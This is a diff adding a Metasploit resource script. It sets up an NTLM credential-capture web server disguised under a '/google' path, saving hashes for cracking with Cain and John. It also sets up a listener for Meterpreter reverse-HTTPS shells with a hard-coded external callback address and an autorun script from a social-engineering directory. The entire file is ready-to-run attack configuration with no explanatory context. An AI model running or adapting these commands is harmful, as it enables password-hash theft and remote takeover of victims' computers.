@@ -1,0 +1,16 @@
+spool /root/Desktop/epb_spool.txt
+use auxiliary/server/capture/http_ntlm
+setg CAINPWFILE /root/Desktop/epb_cain.txt
+setg JOHNPWFILE /root/Desktop/epb_cain.txt
+set SRVPORT 80
+set URIPATH /google
+run
+
+use exploit/multi/handler
+set ExitOnSession false
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 71.4.245.28
+set LPORT 22
+set TARGET 0
+set AutoRunScript multi_console_command -rc /root/social_engineering/autorun.rc
+exploit -j -z
